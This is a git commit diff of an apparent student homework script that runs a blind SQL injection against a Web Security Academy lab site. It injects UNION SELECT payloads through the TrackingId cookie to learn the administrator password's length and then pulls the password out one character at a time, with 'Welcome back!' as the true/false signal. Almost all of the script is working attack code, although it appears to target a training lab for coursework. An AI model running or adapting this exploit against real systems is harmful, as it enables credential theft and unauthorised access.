134b52f8d66ddf80f65b02d9a4daff1049f8338e
Andrew Stevenson <ads6@pdx.edu>
2021-04-22 18:07:11 -0700

    Find length

--- hw2/hw2.py
+++ hw2/hw2.py
@@ -3,31 +3,45 @@ import sys
 import requests
 from bs4 import BeautifulSoup
 import time
+import string
 
-site = 'acc11f0e1fee3ba381ff5407003f006d.web-security-academy.net'
+site = 'ac791f651f062838804d0403003c007a.web-security-academy.net'
 url = f'https://{site}/'
+valid_chars = string.ascii_lowercase + string.digits
 
 
 def try_query(query):
-    print(f'Query: {query}')
+    # print(f'Query: {query}')
     mycookies = {'TrackingId': urllib.parse.quote_plus(query)}
     resp = requests.get(url, cookies=mycookies)
     soup = BeautifulSoup(resp.text, 'html.parser')
-    if soup.find('div', text='Welcome back!'):
-        return True
-    else:
-        return False
+    return soup.find('div', text='Welcome back!')
 
 
-begin_time = time.perf_counter()
-num = 1
-while True:
-    query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
-    print(f'Trying length {num}')
-    if not try_query(query):
-        num = num + 1
-    else:
-        break
+def get_pwd_length():
+    num = 1
+    while True:
+        query = f"x' UNION ALL SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
+        if not try_query(query):
+            num = num + 1
+        else:
+            return num
 
-print(f"Password length is {num}")
-print(f"Time elapsed is {time.perf_counter() - begin_time}")
+
+def get_pwd_linear(length):
+    pwd = ''
+    for x in range(length):
+        for c in valid_chars:
+            query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND password SIMILAR TO '{pwd + c}%'--"
+            if try_query(query):
+                pwd += c
+                print(pwd)
+                break
+    return pwd
+
+
+t = time.perf_counter()
+l = get_pwd_length()
+p = get_pwd_linear(l)
+print(f'Done. Found {p}')
+print(f'Time elapsed is {time.perf_counter() - t}')
